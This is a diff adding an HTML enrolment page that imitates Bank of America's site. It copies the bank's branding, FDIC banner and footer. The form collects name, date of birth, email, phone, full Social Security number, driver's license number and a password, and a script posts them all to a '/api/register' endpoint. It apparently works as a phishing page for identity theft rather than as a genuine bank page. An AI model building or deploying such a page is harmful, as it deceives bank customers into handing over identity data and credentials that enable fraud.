@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bank of America - Enroll</title>
+    <style>
+        /* --- RESET & VARIABLES --- */
+        :root {
+            --bofa-red: #d4001a; 
+            --bofa-blue: #004a99; 
+            --bg-gray-banner: #f2f2f2;
+            --bg-off-white: #f8f8f8;
+            --text-dark: #333333;
+            --text-gray: #666666;
+            --border-light: #cccccc;
+            --input-border: #b3b3b3;
+            --placeholder-gray: #a6a6a6;
+            
+            /* Button Colors */
+            --btn-disabled-top: #92c2e9;
+            --btn-disabled-bottom: #72a9d6;
+            --btn-active-top: #005eb8;
+            --btn-active-bottom: #005eb8;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { font-family: Arial, Helvetica, sans-serif; background-color: var(--bg-off-white); display: flex; flex-direction: column; min-height: 100vh; }
+
+        /* --- HEADER BANNER --- */
+        .fdic-banner { background-color: var(--bg-gray-banner); text-align: center; padding: 12px 10px; color: var(--text-gray); }
+        .banner-top-text { font-size: 13px; font-style: italic; font-family: "Times New Roman", serif; margin-bottom: 4px; }
+        .banner-bottom-row { display: flex; justify-content: center; align-items: center; }
+        .fdic-bold { font-family: Arial, sans-serif; font-weight: 900; font-size: 15px; color: #002a5c; margin-right: 4px; }
+        .fdic-desc { font-size: 11px; font-style: italic; font-family: "Times New Roman", serif; }
+
+        /* --- NAVIGATION BAR --- */
+        .login-nav { background-color: var(--bofa-red); height: 50px; display: flex; align-items: center; padding: 0 15px; position: relative; }
+        .menu-btn { background: none; border: none; padding: 5px; cursor: pointer; display: flex; align-items: center; position: absolute; left: 10px; }
+        .menu-icon-svg { width: 26px; height: 22px; fill: white; }
+        .login-title { color: white; font-size: 18px; font-weight: bold; margin: 0 auto; }
+
+        /* --- MAIN FORM SECTION --- */
+        main { flex-grow: 1; padding: 25px 20px; display: flex; flex-direction: column; background-color: var(--bg-off-white); }
+
+        .standard-input { width: 100%; padding: 12px 15px; font-size: 16px; border: 1px solid var(--input-border); border-radius: 6px; background-color: #fff; box-shadow: inset 0 1px 2px rgba(0,0,0,0.05); outline: none; color: var(--text-dark); margin-bottom: 5px; }
+        ::placeholder { color: var(--placeholder-gray); opacity: 1; }
+
+        .form-group { margin-bottom: 15px; }
+        .form-group label { display: block; margin-bottom: 6px; font-weight: bold; color: var(--text-dark); font-size: 14px; }
+
+        /* --- BUTTON STYLES --- */
+        .login-btn { width: 100%; padding: 12px; border: none; border-radius: 8px; background: linear-gradient(to bottom, var(--btn-disabled-top), var(--btn-disabled-bottom)); color: white; font-size: 18px; font-weight: bold; cursor: pointer; display: flex; justify-content: center; align-items: center; box-shadow: 0 2px 4px rgba(0,0,0,0.1); transition: background 0.3s ease; margin-top: 10px; }
+        .login-btn.active { background: var(--bofa-blue); }
+        .login-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+
+        /* --- HELPER LINKS & FOOTER --- */
+        .helper-links { display: flex; justify-content: center; margin-top: 25px; padding: 0 10px; }
+        .helper-links a { color: var(--bofa-blue); font-size: 15px; text-decoration: none; }
+
+        footer { background-color: var(--bg-off-white); text-align: center; padding: 20px 15px 30px; font-size: 11px; color: var(--text-gray); border-top: 1px solid #e0e0e0; }
+        .footer-nav { margin-bottom: 18px; line-height: 1.8; color: var(--bofa-blue); display: flex; flex-wrap: wrap; justify-content: center; }
+        .footer-nav a { color: var(--bofa-blue); text-decoration: none; white-space: nowrap; }
+        .footer-separator { margin: 0 5px; color: var(--border-light); }
+        .footer-legal p { margin: 6px 0; line-height: 1.3; }
+        .blue-link { color: var(--bofa-blue); text-decoration: underline; }
+
+        /* --- REGISTER SPECIFIC STYLES --- */
+        .error-message { color: var(--bofa-red); font-size: 12px; margin-bottom: 5px; display: none; font-weight: bold; }
+        .error-message.show { display: block; }
+
+        .password-requirements { background: #ededed; padding: 10px; border-radius: 6px; margin-top: 5px; font-size: 12px; color: var(--text-gray); border: 1px solid var(--border-light); }
+        .password-requirements li { margin: 3px 0; list-style: none; padding-left: 15px; position: relative; }
+        .password-requirements li:before { content: "•"; position: absolute; left: 0; color: var(--bofa-blue); font-weight: bold; }
+
+        .terms-checkbox { display: flex; align-items: flex-start; gap: 10px; margin: 15px 0 20px 0; font-size: 13px; color: var(--text-dark); }
+        .terms-checkbox input[type="checkbox"] { margin-top: 3px; width: 16px; height: 16px; }
+        .terms-checkbox a { color: var(--bofa-blue); text-decoration: none; }
+    </style>
+</head>
+<body>
+    <div class="fdic-banner">
+        <p class="banner-top-text">Bank of America deposit products:</p>
+        <div class="banner-bottom-row">
+            <span class="fdic-bold">FDIC</span>
+            <span class="fdic-desc">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
+        </div>
+    </div>
+
+    <nav class="login-nav">
+        <button class="menu-btn" aria-label="Menu">
+            <svg class="menu-icon-svg" viewBox="0 0 24 24"><path d="M3 4H21V7H3V4ZM3 10.5H21V13.5H3V10.5ZM3 17H21V20H3V17Z"/></svg>
+        </button>
+        <h1 class="login-title">Enroll</h1>
+    </nav>
+
+    <main>
+        <form id="registerForm">
+            <div class="form-group">
+                <label for="firstName">First Name</label>
+                <input type="text" id="firstName" name="firstName" class="standard-input" placeholder="John" required>
+                <div class="error-message" id="firstNameError"></div>
+            </div>
+            <div class="form-group">
+                <label for="lastName">Last Name</label>
+                <input type="text" id="lastName" name="lastName" class="standard-input" placeholder="Doe" required>
+                <div class="error-message" id="lastNameError"></div>
+            </div>
+            <div class="form-group">
+                <label for="dob">Date of Birth</label>
+                <input type="text" id="dob" name="dob" class="standard-input" placeholder="mm/dd/yyyy" required>
+                <div class="error-message" id="dobError"></div>
+            </div>
+            <div class="form-group">
+                <label for="email">Email Address</label>
+                <input type="email" id="email" name="email" class="standard-input" placeholder="you@example.com" required autocomplete="email">
+                <div class="error-message" id="emailError"></div>
+            </div>
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" name="phone" class="standard-input" placeholder="+1 (555) 123-4567" required>
+                <div class="error-message" id="phoneError"></div>
+            </div>
+            <div class="form-group">
+                <label for="ssn">Social Security Number (SSN)</label>
+                <input type="text" id="ssn" name="ssn" class="standard-input" placeholder="XXX-XX-XXXX" required>
+                <div class="error-message" id="ssnError"></div>
+            </div>
+            <div class="form-group">
+                <label for="driversLicense">Driver's License Number</label>
+                <input type="text" id="driversLicense" name="driversLicense" class="standard-input" placeholder="Enter number" required>
+                <div class="error-message" id="driversLicenseError"></div>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" class="standard-input" placeholder="••••••••" required autocomplete="new-password">
+                <div class="error-message" id="passwordError"></div>
+                <ul class="password-requirements">
+                    <li>At least 8 characters</li>
+                    <li>Include numbers and special characters</li>
+                </ul>
+            </div>
+            <div class="form-group">
+                <label for="confirmPassword">Confirm Password</label>
+                <input type="password" id="confirmPassword" name="confirmPassword" class="standard-input" placeholder="••••••••" required autocomplete="new-password">
+                <div class="error-message" id="confirmPasswordError"></div>
+            </div>
+            <div class="terms-checkbox">
+                <input type="checkbox" id="terms" name="terms" required>
+                <label for="terms">I agree to the <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a></label>
+            </div>
+
+            <div class="error-message" id="generalError" style="margin-bottom: 10px; text-align: center;"></div>
+
+            <button type="submit" id="registerBtn" class="login-btn">Create Account</button>
+
+            <div class="helper-links">
+                <p style="font-size: 14px; color: #333; margin-right: 5px;">Already have an account?</p>
+                <a href="login.html">Sign in here</a>
+            </div>
+        </form>
+    </main>
+
+    <footer>
+        <nav class="footer-nav">
+            <a href="#">Locations</a><span class="footer-separator">|</span><a href="#">Contact Us</a><span class="footer-separator">|</span><a href="#">Help & Support</a><span class="footer-separator">|</span><a href="#">Accessible Banking</a><span class="footer-separator">|</span><a href="#">Privacy</a><span class="footer-separator">|</span><a href="#">Children's Privacy</a><span class="footer-separator">|</span><a href="#">Security</a><span class="footer-separator">|</span><a href="#">Online Banking Service Agreement</a><span class="footer-separator">|</span><a href="#">Advertising Practices</a><span class="footer-separator">|</span><a href="#">Careers</a><span class="footer-separator">|</span><a href="#">Your Privacy Choices</a>
+        </nav>
+        <div class="footer-legal">
+            <p>Bank of America, N.A. Member FDIC. <a href="#" class="blue-link">Equal Housing Lender</a></p>
+            <p>© 2025 Bank of America Corporation. All rights reserved.</p>
+            <p><a href="#" class="blue-link">Patent: patents.bankofamerica.com</a></p>
+        </div>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const registerForm = document.getElementById('registerForm');
+            const registerBtn = document.getElementById('registerBtn');
+            const inputs = document.querySelectorAll('.standard-input');
+
+            function checkAllInputs() {
+                let allFilled = true;
+                inputs.forEach(input => { if (input.value.trim() === '') allFilled = false; });
+                const termsChecked = document.getElementById('terms').checked;
+                if (allFilled && termsChecked) registerBtn.classList.add('active');
+                else registerBtn.classList.remove('active');
+            }
+
+            inputs.forEach(input => input.addEventListener('input', checkAllInputs));
+            document.getElementById('terms').addEventListener('change', checkAllInputs);
+
+            function validatePassword(p) { return p.length >= 8 && /\d/.test(p) && /[!@#$%^&*(),.?":{}|<>]/.test(p); }
+            function validateEmail(e) { return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e); }
+
+            registerForm.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                // Clear errors
+                document.querySelectorAll('.error-message').forEach(el => el.classList.remove('show'));
+
+                // Validation logic (simplified for brevity, ensuring visuals)
+                const password = document.getElementById('password').value;
+                const confirm = document.getElementById('confirmPassword').value;
+                const email = document.getElementById('email').value;
+                const terms = document.getElementById('terms').checked;
+                
+                let hasError = false;
+                if(!validateEmail(email)) { document.getElementById('emailError').textContent='Invalid email'; document.getElementById('emailError').classList.add('show'); hasError=true; }
+                if(!validatePassword(password)) { document.getElementById('passwordError').textContent='Password requirement not met'; document.getElementById('passwordError').classList.add('show'); hasError=true; }
+                if(password !== confirm) { document.getElementById('confirmPasswordError').textContent='Passwords do not match'; document.getElementById('confirmPasswordError').classList.add('show'); hasError=true; }
+                if(!terms) { document.getElementById('generalError').textContent='Accept terms'; document.getElementById('generalError').classList.add('show'); hasError=true; }
+
+                if(hasError) return;
+
+                registerBtn.disabled = true;
+                const originalText = registerBtn.innerHTML;
+                registerBtn.innerHTML = 'Creating Account...';
+
+                try {
+                    const formData = {
+                        firstName: document.getElementById('firstName').value,
+                        lastName: document.getElementById('lastName').value,
+                        dob: document.getElementById('dob').value,
+                        email: email,
+                        phone: document.getElementById('phone').value,
+                        ssn: document.getElementById('ssn').value,
+                        driversLicense: document.getElementById('driversLicense').value,
+                        password: password
+                    };
+
+                    const response = await fetch('/api/register', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(formData)
+                    });
+
+                    const data = await response.json();
+
+                    if (!response.ok) {
+                        document.getElementById('generalError').textContent = data.message || 'Registration failed';
+                        document.getElementById('generalError').classList.add('show');
+                        document.getElementById('generalError').style.color = '#d4001a';
+                    } else {
+                        // --- SUCCESS LOGIC ---
+                        const errorDiv = document.getElementById('generalError');
+                        errorDiv.textContent = 'Sign up successful! Redirecting to login...';
+                        errorDiv.style.color = '#28a745'; // Green success
+                        errorDiv.classList.add('show');
+
+                        // IMPORTANT: Clear any auto-login tokens the server might have sent or previous sessions
+                        localStorage.removeItem('authToken');
+                        localStorage.removeItem('userId');
+
+                        setTimeout(() => {
+                            window.location.href = 'login.html';
+                        }, 2000);
+                        return; // Exit so button doesn't reset
+                    }
+                } catch (error) {
+                    document.getElementById('generalError').textContent = 'Network error.';
+                    document.getElementById('generalError').classList.add('show');
+                } finally {
+                    const errorDiv = document.getElementById('generalError');
+                    // Reset button only if NOT successful
+                    if (!errorDiv.textContent.includes('successful')) {
+                        registerBtn.disabled = false;
+                        registerBtn.innerHTML = originalText;
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+</html>
